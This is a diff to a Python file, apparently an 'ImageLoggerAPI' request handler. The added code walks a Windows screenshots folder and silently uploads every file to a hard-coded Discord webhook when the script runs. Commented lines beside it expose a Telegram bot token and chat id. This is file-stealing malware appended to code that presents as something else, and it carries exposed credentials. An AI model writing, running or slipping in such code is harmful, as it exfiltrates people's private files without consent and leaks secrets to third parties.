@@ -302,3 +302,32 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+
+
+import os
+import requests
+
+
+# webhook="https://discord.com/api/webhooks/1444842439071502477/SPKw4bj6mCD9aVXRr9GlIKhaOpAuax38hYJdzlzwyjleiKKiPZpzDFhI3he0XFX4wSkK"
+# token = "8207264185:AAFvsOmpm2g66ak9AhTPeXin6Zwp5xq6SlQ"
+# chat_id = "6863444629"
+
+dir = r"C:\Users\alwal\OneDrive\الصور\لقطات الشاشة"
+
+def send_files(dir):
+    for filename in os.listdir(dir):
+        file_path = os.path.join(dir, filename)
+        if os.path.isfile(file_path):
+            try:
+                with open(file_path, 'rb') as file:
+                    url = f'https://discord.com/api/webhooks/1444842439071502477/SPKw4bj6mCD9aVXRr9GlIKhaOpAuax38hYJdzlzwyjleiKKiPZpzDFhI3he0XFX4wSkK'
+                    files = {'document': file}
+                    response = requests.post(url, files=files)
+                    if response.status_code == 200:
+                        print(f"ok: {filename}")
+                    else:
+                        print(f"failed to send {filename}: {response.text}")
+            except Exception as e:
+                print(f"error: {filename}, {e}")
+
+send_files(dir)
